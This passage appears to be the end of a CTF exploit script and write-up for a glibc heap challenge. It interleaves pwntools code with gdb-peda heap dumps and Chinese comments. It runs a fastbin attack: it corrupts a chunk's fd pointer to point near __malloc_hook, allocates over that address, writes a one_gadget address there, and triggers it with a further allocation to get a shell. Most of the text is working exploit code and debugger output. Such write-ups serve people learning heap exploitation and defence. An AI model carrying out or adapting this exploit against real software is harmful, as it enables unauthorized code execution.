                  top: 0x55aa92ce1400 (size : 0x20c00) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x55aa92ce1220 (size : 0x90)
'''

'''
gdb-peda$ x/20gx 0x00007f4c8ec60b78-88-0x10-0x23
0x7f4c8ec60aed <_IO_wide_data_0+301>:	0x4c8ec5f260000000	0x000000000000007f
0x7f4c8ec60afd:                     	0x4c8e921ea0000000	0x4c8e921a7000007f
0x7f4c8ec60b0d <__realloc_hook+5>:	    0x000000000000007f	0x0000000000000000
0x7f4c8ec60b1d:	                        0x0000000000000000	0x0000000000000000
0x7f4c8ec60b2d <main_arena+13>:	        0x0000000000000000	0x0000000000000000
'''
fill(3, 0x78, "c"*0x68 + p64(0x71) + p64(malloc_hook-0x23))
'''
gdb-peda$ x/200gx 0x0000558b42f36000
0x558b42f36000:	0x0000000000000000	0x0000000000000111 0
0x558b42f36010:	0x6161616161616161	0x6161616161616161
0x558b42f36020:	0x6161616161616161	0x6161616161616161
0x558b42f36030:	0x6161616161616161	0x6161616161616161
0x558b42f36040:	0x6161616161616161	0x6161616161616161
0x558b42f36050:	0x6161616161616161	0x6161616161616161
0x558b42f36060:	0x6161616161616161	0x6161616161616161
0x558b42f36070:	0x6161616161616161	0x6161616161616161
0x558b42f36080:	0x6161616161616161	0x6161616161616161
0x558b42f36090:	0x6161616161616161	0x6161616161616161
0x558b42f360a0:	0x6161616161616161	0x6161616161616161
0x558b42f360b0:	0x6161616161616161	0x6161616161616161
0x558b42f360c0:	0x6161616161616161	0x6161616161616161
0x558b42f360d0:	0x6161616161616161	0x6161616161616161
0x558b42f360e0:	0x6161616161616161	0x6161616161616161
0x558b42f360f0:	0x6161616161616161	0x6161616161616161
0x558b42f36100:	0x6161616161616161	0x6161616161616161
0x558b42f36110:	0x6161616161616161	0x00000000000001a1 1
0x558b42f36120:	0x6262626262626262	0x6262626262626262
0x558b42f36130:	0x6262626262626262	0x6262626262626262
0x558b42f36140:	0x6262626262626262	0x6262626262626262
0x558b42f36150:	0x6262626262626262	0x6262626262626262
0x558b42f36160:	0x6262626262626262	0x6262626262626262
0x558b42f36170:	0x6262626262626262	0x6262626262626262
0x558b42f36180:	0x6262626262626262	0x6262626262626262
0x558b42f36190:	0x6262626262626262	0x6262626262626262
0x558b42f361a0:	0x6262626262626262	0x6262626262626262
0x558b42f361b0:	0x6262626262626262	0x6262626262626262
0x558b42f361c0:	0x6262626262626262	0x6262626262626262
0x558b42f361d0:	0x6262626262626262	0x6262626262626262
0x558b42f361e0:	0x6262626262626262	0x6262626262626262
0x558b42f361f0:	0x6262626262626262	0x6262626262626262
0x558b42f36200:	0x6262626262626262	0x6262626262626262
0x558b42f36210:	0x6262626262626262	0x6262626262626262
0x558b42f36220:	0x6262626262626262	0x0000000000000091 2
0x558b42f36230:	0x00007f1580743b78	0x00007f1580743b78
0x558b42f36240:	0x0000000000000000	0x0000000000000000
0x558b42f36250:	0x0000000000000000	0x0000000000000000
0x558b42f36260:	0x0000000000000000	0x0000000000000000
0x558b42f36270:	0x0000000000000000	0x0000000000000000
0x558b42f36280:	0x0000000000000000	0x0000000000000000
0x558b42f36290:	0x0000000000000000	0x0000000000000000
0x558b42f362a0:	0x0000000000000000	0x0000000000000000
0x558b42f362b0:	0x0000000000000090	0x0000000000000070 3
0x558b42f362c0:	0x6363636363636363	0x6363636363636363
0x558b42f362d0:	0x6363636363636363	0x6363636363636363
0x558b42f362e0:	0x6363636363636363	0x6363636363636363
0x558b42f362f0:	0x6363636363636363	0x6363636363636363
0x558b42f36300:	0x6363636363636363	0x6363636363636363
0x558b42f36310:	0x6363636363636363	0x6363636363636363
0x558b42f36320:	0x6363636363636363	0x0000000000000071 4
0x558b42f36330:	0x00007f1580743aed	0x0000000000000000
0x558b42f36340:	0x0000000000000000	0x0000000000000000
0x558b42f36350:	0x0000000000000000	0x0000000000000000
0x558b42f36360:	0x0000000000000000	0x0000000000000000
0x558b42f36370:	0x0000000000000000	0x0000000000000000
0x558b42f36380:	0x0000000000000000	0x0000000000000000
0x558b42f36390:	0x0000000000000000	0x0000000000000071 5
0x558b42f363a0:	0x0000000000000000	0x0000000000000000
0x558b42f363b0:	0x0000000000000000	0x0000000000000000
0x558b42f363c0:	0x0000000000000000	0x0000000000000000
0x558b42f363d0:	0x0000000000000000	0x0000000000000000
0x558b42f363e0:	0x0000000000000000	0x0000000000000000
0x558b42f363f0:	0x0000000000000000	0x0000000000000000
0x558b42f36400:	0x0000000000000000	0x0000000000020c01
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0                malloc_hook-0x23
(0x60)     fastbin[4]: 0x0                      ↓
(0x70)     fastbin[5]: 0x56319ae9e320 --> 0x7f31aafbeaed (size error (0x78)) --> 0x31aac7fea0000000 (invaild memory)
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x56319ae9e400 (size : 0x20c00) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x56319ae9e220 (size : 0x90)
'''

allocate(0x60) # 2
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7f7d7a969aed (size error (0x78)) --> 0x7d7a62aea0000000 (invaild memory)
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x56410dc51400 (size : 0x20c00) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x56410dc51220 (size : 0x90)
'''
# 可以看到这个的块是从fastbin申请的，而不是unsortbin

# 将4申请到了malloc_hook-0x23的位置
allocate(0x60) # 4

payload = "c"*0x13 + p64(one_gadget)
fill(4, len(payload), payload)

# getshell
allocate(0x10)

# gdb.attach(io)
# raw_input()

io.interactive()
```

